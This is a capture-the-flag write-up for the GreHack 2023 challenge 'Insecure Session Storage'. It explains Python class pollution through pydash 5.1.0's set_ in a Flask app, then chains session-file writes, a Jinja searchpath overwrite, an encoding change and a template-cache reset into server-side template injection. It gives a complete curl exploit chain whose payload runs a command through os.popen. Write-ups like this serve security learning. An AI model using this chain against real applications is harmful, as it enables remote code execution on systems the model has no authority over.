---
source: kevin-mizu
source_url: https://mizu.re/post/insecure-session-storage
title: "Insecure Session Storage | mizu.re"
description: "Insecure Session Storage"
---

_keyboard\_arrow\_up_

title: Insecure Session Storage

date: Nov 03, 2023

tags: [Writeup](https://mizu.re/tag/Writeup) [Web](https://mizu.re/tag/Web) [RCE](https://mizu.re/tag/RCE)

# Insecure Session Storage

![](https://mizu.re/articles/writeups/grehack2023/insecure_session_storage/images/grephack.png)

* * *

Difficulty: 450 points \| 1 solves

Description: I've started to play with Flask session local caching. The application isn't finished yet, but it should be safe, riiiiiight?

Sources: [insecure\_session\_storage.zip](https://mizu.re/articles/writeups/grehack2023/insecure_session_storage/insecure_session_storage.zip)

Author: [Me :p](https://twitter.com/kevin_mizu)

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/insecure-session-storage#%EF%B8%8F-recon)
- [🏭 Class Pollution](https://mizu.re/post/insecure-session-storage#-class-pollution)
- [✍️ File Write](https://mizu.re/post/insecure-session-storage#%EF%B8%8F-file-write)
- [🖼️ Jinja template](https://mizu.re/post/insecure-session-storage#%EF%B8%8F-jinja-template)
- [💥 TL/DR: Chain everything together](https://mizu.re/post/insecure-session-storage#-tldr-chain-everything-together)
- [🚩 Retrieve the flag](https://mizu.re/post/insecure-session-storage#-retrieve-the-flag)

## 🕵️ Recon

For this challenge, there is no client side, and a very short backend code:

- /src/app.py:

```python
from flask import Flask, session, request, render_template, jsonify
from cachelib.file import FileSystemCache
from flask_session import Session
from secrets import token_hex
from os.path import join
from pydash import set_

# custom caching mechanism
class Settings:
    def __init__(self):
        pass # TODO

class LocalCache(FileSystemCache):
    def _get_filename(self, key: str) -> str:
        if ".." in key:
            key = token_hex(8)
        return join(self._path, key)

# init
app = Flask(__name__)
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)
app.session_interface.cache = LocalCache("flask_session")

# routes
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    else:
        body = request.json
        if not "key" in body or not "value" in body:
            return jsonify({ "res": "[ERROR] key & value must be set" })
        set_(Settings(), body["key"], body["value"])
        return render_template("index.html")

# main
if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```

Additionally, due to the presence of a getflag binary, we know that we need to get a Remote Code Execution (RCE):

- /Dockerfile:

```dockerfile
# ...

# Setup flag
COPY flag.txt /flag.txt
COPY getflag /getflag
RUN chmod 600 /flag.txt && \
    chmod 4755 /getflag /getflag

# ...
```

Furthermore, an old version of [pydash](https://github.com/dgilland/pydash) is used:

- /src/requirements.txt:

```
Flask
flask-session
pydash==5.1.0
```

## 🏭 Class Pollution

The fact that the challenge is using set\_ of pydash==5.1.0 is really important as this version is vulnerable to class pollution!

But, before continuing, what is a class pollution?

Like javascript prototype pollution, python class pollution involves polluting class / object in a process context. For example:

![](https://mizu.re/articles/writeups/grehack2023/insecure_session_storage/images/class-pollution.png)

As you can see in the above snippet, \_\_qualname\_\_ is overwritten even for the new object! The equivalent of this with a vulnerable version of pydash would be:

![](https://mizu.re/articles/writeups/grehack2023/insecure_session_storage/images/class-pollution2.png)

_More information about this type of vulnerability can be found [here](https://blog.abdulrah33m.com/prototype-pollution-in-python/)._

In the challenge, this can be abuse in the index route:

- /src/app.py:

```python
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    else:
        body = request.json
        if not "key" in body or not "value" in body:
            return jsonify({ "res": "[ERROR] key & value must be set" })
        set_(Settings(), body["key"], body["value"])
        return render_template("index.html")
```

> But, how could this be leverage in the challenge context?

In fact, the custom flask-session caching is an hint about the final exploit. As we can see, the session's filename is the current session's key. This can be leveraged using the following strategy:

1\. Use the flask-session mechanism to create an index.html file inside the flask\_session folder.

2\. Change the render\_template folder.

3\. Reload the index.html templating.

## ✍️ File Write

In order to control the session's filename, we need to know what the key value is:

- flask-session \> /src/flask\_session/sessions.py ( [ref](https://github.com/pallets-eco/flask-session/blob/09094d30cfa1aace46f93a192260940bf95cf97b/src/flask_session/sessions.py#L356))

```python
def save_session(self, app, session, response):
    # ...
    data = dict(session)
    self.cache.set(self.key_prefix + session.sid, data, total_seconds(app.permanent_session_lifetime))
    # ...
```

- cachelib \> /src/cachelib/file.py ( [ref](https://github.com/pallets-eco/cachelib/blob/dc82ed99361dd3f6d77626508e01fd15e6f7c51e/src/cachelib/file.py#L229))

```python
def set(
    self,
    key: str,
    value: _t.Any,
    timeout: _t.Optional[int] = None,
    mgmt_element: bool = False,
) -> bool:
    # ...
    filename = self._get_filename(key)
    # ...
    with os.fdopen(fd, "wb") as f:
        f.write(struct.pack("I", timeout))
        self.serializer.dump(value, f)
    # ...
```

As we can see, the filename is determined by self.key\_prefix + session.sid. Additionally, the file contains the serialized session data which includes the clear text of keys → values 👀

![sessions.png](https://mizu.re/articles/writeups/grehack2023/insecure_session_storage/images/sessions.png)

Thanks to this, it might be possible to have a full control over the session filename and a partial control over the file content. To do this, we need to:

1\. Update the session prefix to index.:

```python
set_(Settings(), "__class__.__init__.__globals__.app.session_interface.key_prefix", "index.")
```

2\. Create a session with html as sid:

```bash
# Because flask-session are not permanent, session.sid it the current session value
curl -H "cookie: session=html" http://localhost:5000/
```

3\. Create a session's key that has a jinja2 template as a value:

```python
set_(Settings(), "__class__.__init__.__globals__.session.rce", "{{7*7}}")
```

_Part 2 & 3 must be done in 1 request._

## 🖼️ Jinja template

Now that we can create an index.html file that contains a jinja payload, we need to find a way to change the templating folder.

In the flask source code, templating are listed this way:

- flask \> /src/flask/templating.py ( [ref](https://github.com/pallets/flask/blob/8d9519df093864ff90ca446d4af2dc8facd3c542/src/flask/templating.py#L113))

```python
def list_templates(self) -> list[str]:
    result = set()
    loader = self.app.jinja_loader
    if loader is not None:
        result.update(loader.list_templates()) # here it use the templating library listing method -> jinja in our case
    # ...
    return list(result)
```

- jinja \> /src/jinja2/loaders.py ( [ref](https://github.com/pallets/jinja/blob/d594969d722ceb4e8f3da8861befc9c0ac87ae1b/src/jinja2/loaders.py#L222))

```python
def list_templates(self) -> t.List[str]:
    found = set()
    for searchpath in self.searchpath:
        walk_dir = os.walk(searchpath, followlinks=self.followlinks)
        # ...
    return sorted(found)
```

As we can see, app.jinja\_loader.searchpath contains an array of paths that are resolved to search for a template file. This can be overwritten this way using set\_:

```python
set_(Settings(), "__class__.__init__.__globals__.app.jinja_loader.searchpath", ["/usr/app/flask_session"])
```

Therefore, this won't be enough as template are cached by default by jinja after being generated.

- jinja \> /src/jinja2/environment.py ( [ref](https://github.com/pallets/jinja/blob/d594969d722ceb4e8f3da8861befc9c0ac87ae1b/src/jinja2/environment.py#L357))

```python
def __init__(
    self,
    # ...
):
    # ...
    # set the loader provided
    self.loader = loader
    self.cache = create_cache(cache_size) # here
    self.bytecode_cache = bytecode_cache
    self.auto_reload = auto_reload
```

- jinja \> /src/jinja2/environment.py ( [ref](https://github.com/pallets/jinja/blob/d594969d722ceb4e8f3da8861befc9c0ac87ae1b/src/jinja2/environment.py#L80))

```python
def create_cache(
    size: int,
)
    # ...
    if size < 0:
        return {}

    return LRUCache(size)  # type: ignore
```

As we can see, the jinja cache is handled by app.jinja\_env.cache which is a LRUCache object. Fortunately, overwriting it by an empty object is enough to clear the cache :)

```python
set_(Settings(), "__class__.__init__.__globals__.app.jinja_env.cache", {})
```

The last problem that we gonna face is the fact that flask-session use invalid UTF-8 bytes which makes jinja crash when decoding. Bellow is where the issue occurs:

- jinja \> /src/jinja2/loaders.py ( [ref](https://github.com/pallets/jinja/blob/d594969d722ceb4e8f3da8861befc9c0ac87ae1b/src/jinja2/loaders.py#L368))

```python
def get_source(
    self, environment: "Environment", template: str
)
    # ...
    return source.decode(self.encoding), p, up_to_date
```

As we can see, this can be fixed by changing the encoding value:

```python
set_(Settings(), "__class__.__init__.__globals__.app.jinja_loader.encoding", "iso-8859-1")
```

## 💥 TL/DR: Chain everything together

1\. Update session file prefix to index..

2\. Create an index.html session file (session=html) containing jinja RCE.

3\. Update jinja templates path to session folder.

4\. Update jinja encoding to handle binary (iso-8859-1).

5\. Clear jinja cache and trigger the new template file.

```bash
# 1
curl -X POST -H "Content-Type: application/json" -d '{"key":"__class__.__init__.__globals__.app.session_interface.key_prefix", "value": "index."}' http://localhost:5000/

# 2
curl -X POST -H "Cookie: session=html" -H "Content-Type: application/json" -d '{"key":"__class__.__init__.__globals__.session.rce", "value": "{{cycler.__init__.__globals__.os.popen(\"/getflag\").read()}}"}' http://localhost:5000/

# 3
curl -X POST -H "Content-Type: application/json" -d '{"key":"__class__.__init__.__globals__.app.jinja_loader.searchpath", "value": ["/usr/app/flask_session"]}' http://localhost:5000/

# 4
curl -X POST -H "Content-Type: application/json" -d '{"key":"__class__.__init__.__globals__.app.jinja_loader.encoding", "value": "iso-8859-1"}' http://localhost:5000/

# 5
curl -X POST -H "Content-Type: application/json" -d '{"key":"__class__.__init__.__globals__.app.jinja_env.cache", "value": {}}' http://localhost:5000/ --output -
```

## 🚩 Retrieve the flag

Run the bash script.

![flag.png](https://mizu.re/articles/writeups/grehack2023/insecure_session_storage/images/flag.png)

Flag: GH{PyTh0n\_Cl4sS\_Pol1uT10n\_4r3\_StR0ng} 🎉

[_keyboard\_arrow\_left_ Another HTML Renderer](https://mizu.re/post/another-html-renderer)

[Intigriti October 2023 - XSS Challenge _keyboard\_arrow\_right_](https://mizu.re/post/intigriti-october-2023-xss-challenge)